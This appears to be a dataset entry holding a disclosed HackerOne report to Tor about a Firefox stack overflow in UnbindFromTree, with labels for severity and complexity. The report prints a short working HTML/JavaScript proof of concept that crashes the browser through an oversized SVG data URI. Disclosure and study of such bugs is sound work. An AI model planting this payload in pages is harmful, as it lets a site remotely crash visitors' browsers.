{
    "reported_to": "Tor",
    "reported_by": "geeknik ",
    "title": "Stack overflow in UnbindFromTree (browser can be crashed remotely)",
    "content": "\nI reported this bug to Mozilla approximately 9 months ago and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty.\nCode:\nCode 205 Bytes\n1<html>\n2<head></head>\n3<body>\n4<script>\n5function done() {\n6}\n7\n8var x = '';\n9for (i=0; i<500000; ++i)\n10  x += '<a>';\n11var uri = 'data:image/svg+xml,' + x;\n12var i = new Image();\n13i.src = uri;\n14</script>\n15</body>\n16</html>\nThe caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. This link will probably crash your Firefox. A WinDBG stack trace is located here.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Stack Overflow"
    ],
    "screenshots": {},
    "disclosed_date": 1506944400,
    "report_url": "https://hackerone.com/reports/264481",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create an HTML file with a script that generates a very long string of SVG anchor tags (<a>)"
        ],
        [
            2,
            "Load this HTML file in a vulnerable version of Firefox to trigger a stack overflow in the UnbindFromTree function"
        ]
    ],
    "vuln_description": "The vulnerability is a stack overflow in Firefox's UnbindFromTree function, which can be triggered remotely by loading a specially crafted SVG image containing an extremely long string of anchor tags. This causes the browser to crash.",
    "reason": "The vulnerability requires understanding how to craft a malicious SVG image and how to trigger the stack overflow, but the components are straightforward and the interaction is not particularly subtle.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}